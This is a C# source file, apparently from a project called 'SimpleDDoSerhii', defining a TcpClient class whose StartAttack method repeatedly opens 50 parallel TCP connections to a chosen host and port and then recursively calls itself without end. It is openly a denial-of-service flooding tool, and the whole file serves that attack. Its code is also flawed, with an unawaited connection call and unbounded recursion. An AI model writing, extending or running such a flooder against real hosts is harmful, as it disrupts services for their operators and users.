using SimpleDDoSerhii.Entites;
using System;
using System.Threading.Tasks;
using System.Threading;
using SimpleDDoSerhii.Exceptions;

namespace SimpleDDoSerhii.Clients
{
    public class TcpClient : IClient, IDisposable
    {
        private bool disposedValue;
        //[ThreadStatic]
        //private System.Net.Sockets.TcpClient _client;
        private ConsoleColor TextColor;
        public TcpClient()
        {
            TextColor =
                        Console.ForegroundColor = (ConsoleColor)(new Random().Next(Enum.GetNames(typeof(ConsoleColor)).Length));

        }
        public void StartAttack(NetworkCredentional networkCredentional)
        {
            
            Parallel.For(0, 50, i =>
            {
                try
                {
                    Console.ForegroundColor = TextColor;
                    var client = new System.Net.Sockets.TcpClient();
                    client.ConnectAsync(networkCredentional.EndPointAddress, networkCredentional.DestinationPort);
                    client.Close();
                    Console.WriteLine($"{DateTime.Now.ToLongTimeString()}:  Sent to endpoint {networkCredentional.EndPointAddress}:{networkCredentional.DestinationPort} By protocol: {networkCredentional.Protocol}");
                    Console.ResetColor();
                }
                catch (BaseException e)
                {
                    Console.WriteLine(e.Message);
                    Dispose();
                }
            });
            StartAttack(networkCredentional);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!disposedValue)
            {
                if (disposing)
                {
                    //this._client.Dispose();
                }
                disposedValue = true;
            }
        }

        public void Dispose()
        {
            Dispose(disposing: true);
            GC.SuppressFinalize(this);
        }
    }
}
